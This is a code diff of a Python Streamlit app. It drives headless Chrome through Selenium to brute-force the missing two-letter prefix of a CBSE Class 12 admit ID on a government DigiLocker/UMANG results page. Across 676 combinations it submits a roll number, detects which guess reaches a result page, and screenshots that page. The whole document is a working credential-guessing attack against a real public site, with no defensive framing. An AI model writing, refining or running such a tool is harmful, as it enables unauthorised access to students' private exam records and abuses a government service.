@@ -1,130 +1,95 @@
 import streamlit as st
-import os
-import time
-import string
+import os, time, string
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
-from selenium.common.exceptions import NoSuchElementException
 
 # ========================= CONFIGURATION =========================
 URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"
 
 def get_driver():
-    """Sets up a lean, headless Chrome instance for Render."""
     options = Options()
     options.add_argument("--headless=new")
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
     options.add_argument("--disable-gpu")
-    options.add_argument("--window-size=1280,720")
-    options.add_argument("--blink-settings=imagesEnabled=false")
-    
+    options.add_argument("--window-size=1280,1024") # Larger window to see more
     render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
     if os.path.exists(render_bin):
         options.binary_location = render_bin
-        
     return webdriver.Chrome(options=options)
 
-def is_success(driver):
-    """
-    STRICT LOGIC RE-CHECK:
-    1. If 'No data found' is visible -> Return False
-    2. If success keywords appear in page source -> Return True
-    3. If URL changes to a result route -> Return True
-    """
+def check_for_success(driver):
+    """Refined logic: Is the user actually looking at a result?"""
     try:
-        # Check for the error message div
-        error_elements = driver.find_elements(By.ID, "err_msg")
-        if error_elements:
-            error_elem = error_elements[0]
-            # If it's displayed AND specifically contains the failure text
-            if error_elem.is_displayed() and "no data found" in error_elem.text.lower():
-                return False
-        
-        # If we got past the error check, look for keywords in the page source
-        page_text = driver.page_source.lower()
-        success_indicators = ["marks", "result", "subject", "grade", "total", "pass", "percentage"]
-        
-        if any(ind in page_text for ind in success_indicators):
-            return True
-            
-        # Check for URL change (Result pages usually lose the .html suffix or gain /result/)
-        curr_url = driver.current_url.lower()
-        if "result" in curr_url and "error" not in curr_url and ".html" not in curr_url:
-            return True
-            
-    except Exception:
+        # 1. If 'No data found' is visible, it's a definite fail.
+        err_msg = driver.find_elements(By.ID, "err_msg")
+        if err_msg and err_msg[0].is_displayed() and "no data" in err_msg[0].text.lower():
+            return False, "Error: No Data Found"
+
+        # 2. Look for the "Marks" table or student name which only appears on success
+        page_source = driver.page_source.lower()
+        success_keys = ["marks", "statement", "subject", "total", "result:", "candidate", "grade"]
+        if any(key in page_source for key in success_keys):
+            return True, "Found Success Keywords"
+
+        # 3. Check if we are still on the login page. 
+        # If the 'rroll' input is GONE, we probably redirected to the result!
+        if len(driver.find_elements(By.ID, "rroll")) == 0:
+            return True, "Redirected away from login"
+
+    except:
         pass
-    
-    return False
+    return False, "Still on Login"
 
-# ========================= STREAMLIT UI =========================
-st.set_page_config(page_title="Admit ID Recovery", page_icon="🎓")
+# ========================= UI =========================
+st.set_page_config(page_title="CBSE Result Brute", layout="wide")
+st.title("🔍 CBSE Admit ID Recovery (Debug Edition)")
 
-st.markdown("""
-    <style>
-    .stButton>button { width: 100%; border-radius: 5px; height: 3em; background-color: #ff4b4b; color: white; }
-    </style>
-    """, unsafe_allow_html=True)
-
-st.title("🎓 CBSE 12th Admit ID Recovery")
-
-col1, col2 = st.columns(2)
+col1, col2 = st.columns([1, 1])
 with col1:
-    roll_val = st.text_input("Roll Number", value="18615899")
-with col2:
-    suffix_val = st.text_input("Last 6 Characters", value="994511")
+    roll_val = st.text_input("Roll Number", "18615899")
+    suffix_val = st.text_input("Admit ID Suffix", "994511")
+    delay = st.slider("Wait for result (sec)", 0.5, 5.0, 1.5)
 
-delay_val = st.slider("Wait for page response (Seconds)", 0.5, 4.0, 1.2)
+debug_slot = st.empty() # For showing what the browser sees
 
-if st.button("🚀 Start Brute Force"):
-    progress_bar = st.progress(0)
+if st.button("🚀 Start Search"):
+    driver = get_driver()
+    letters = string.ascii_uppercase
+    combos = [f"{a}{b}" for a in letters for b in letters]
     
-    driver = None
     try:
-        driver = get_driver()
-        letters = string.ascii_uppercase
-        combos = [f"{a}{b}" for a in letters for b in letters]
-        total = len(combos)
-        
-        with st.status("Brute forcing...", expanded=True) as status:
+        with st.status("Searching...", expanded=True) as status:
             for i, prefix in enumerate(combos):
-                code = f"{prefix}{suffix_val}"
-                status.update(label=f"Testing: **{code}** ({i+1}/{total})")
-                progress_bar.progress((i + 1) / total)
+                full_id = f"{prefix}{suffix_val}"
+                status.update(label=f"Testing: {full_id} ({i+1}/676)")
                 
-                # 1. HARD REFRESH: Opens page fresh for every attempt
                 driver.get(URL)
-                time.sleep(0.5) 
+                time.sleep(0.8) # Load time
                 
                 try:
-                    # 2. FILL FIELDS
                     driver.find_element(By.ID, "rroll").send_keys(roll_val)
-                    driver.find_element(By.ID, "admn_id").send_keys(code)
-                    
-                    # 3. SUBMIT
+                    driver.find_element(By.ID, "admn_id").send_keys(full_id)
                     driver.find_element(By.ID, "submit").click()
                     
-                    # 4. WAIT for the site's server-side logic to trigger
-                    time.sleep(delay_val)
+                    time.sleep(delay)
                     
-                    # 5. EXECUTE SUCCESS LOGIC
-                    if is_success(driver):
-                        status.update(label="✅ Success!", state="complete")
+                    is_hit, reason = check_for_success(driver)
+                    
+                    if is_hit:
                         st.balloons()
-                        st.success(f"### 🎉 Match Found!\n**Admit ID:** `{code}`")
-                        st.code(code)
+                        st.success(f"🎉 SUCCESS! ID: **{full_id}**")
+                        st.info(f"Reason: {reason}")
+                        # Take a screenshot so you can see the result!
+                        st.image(driver.get_screenshot_as_png(), caption="Result Screen")
                         break
-                        
-                except Exception:
-                    continue 
-            else:
-                status.update(label="❌ Not Found", state="error")
-                st.warning("Finished all combinations without a match.")
+                    
+                    # Optional: Every 10 attempts, show the current screen in the debug slot
+                    if i % 10 == 0:
+                        debug_slot.image(driver.get_screenshot_as_png(), caption=f"Last attempted: {full_id}")
 
-    except Exception as e:
-        st.error(f"Error: {e}")
+                except Exception as e:
+                    continue
     finally:
-        if driver:
-            driver.quit()
+        driver.quit()
